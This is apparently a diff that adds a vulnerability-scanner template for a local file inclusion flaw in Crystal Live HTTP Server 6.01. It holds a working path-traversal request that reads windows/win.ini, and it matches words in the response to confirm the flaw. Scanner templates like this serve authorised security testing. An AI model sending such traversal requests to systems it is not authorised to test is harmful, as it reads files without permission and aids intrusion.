@@ -1,0 +1,23 @@
+id: crystal-live-server-lfi
+brief:
+    title: Crystal Live HTTP Server 6.01 - Local File Inclusion
+    by: 0x_Akoko
+    level: high
+    about: Crystal Live HTTP Server 6.01 is vulnerable to local file inclusion.
+    label:
+        - lfi
+        - crystal
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/../../../../../../../../../../../../windows/win.ini'
+      signs:
+        - "on": word
+          has:
+            - bit app support
+            - fonts
+            - extensions
+          in: body
+          need: all
